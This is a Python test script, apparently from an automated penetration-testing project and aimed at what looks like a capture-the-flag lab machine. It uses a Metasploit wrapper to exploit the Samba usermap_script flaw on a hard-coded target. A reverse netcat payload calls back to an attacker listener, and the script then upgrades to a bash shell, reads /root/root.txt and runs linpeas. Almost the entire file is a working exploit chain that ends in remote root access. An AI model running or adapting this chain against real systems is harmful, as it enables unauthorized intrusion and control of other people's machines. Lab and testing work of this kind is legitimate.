import sys
import os
import time
from pathlib import Path


sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from exploit.Metasploit import MetasploitExecutor
from priviledgeEscalation.Linpeas import run_linpeas

def test_real_target():
  
    print("Creating Metasploit executor...")
    me = MetasploitExecutor(
        password='password',  
        host_ip='10.10.14.153',  
        listening_port=4444
    )
    print("Metasploit executor created successfully")
    
    try:
        # Run the exploit
        print("Running exploit...")
        print("Checking available sessions before exploit...")
        print(f"Available sessions: {me.get_sessions()}")
        
        me.exploit_and_execute_payload(
            exploit_module_name='multi/samba/usermap_script',
            payload_module_name='cmd/unix/reverse_netcat',
            RHOSTS='10.129.221.171',  
            LHOST='10.10.14.153', 
            LPORT=4444
        )
        
        print("Waiting for session to be established...")
        time.sleep(5)
        
        sessions = me.get_sessions()
        print(f"Available sessions: {sessions}")
        
        if not sessions:
            raise Exception("No sessions available after exploit")
    
        session_id = list(sessions.keys())[0]
        print(f"Using session: {session_id}")
        
        print("Getting shell and running initial commands...")
        commands = [
            'whoami',
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            'cd /root',
            'cat root.txt'
        ]
        print(f"Sending commands to session {session_id}: {commands}")
        result = me.communicate_with_msf_session(
            session_id=session_id,
            input_texts=commands
        )
        
        print("Running linpeas...")
        run_linpeas(me)
        print("Linpeas execution completed")
        
    except Exception as e:
        print(f"Error during test: {e}")
        import traceback
        traceback.print_exc()
        raise

if __name__ == "__main__":
    test_real_target()
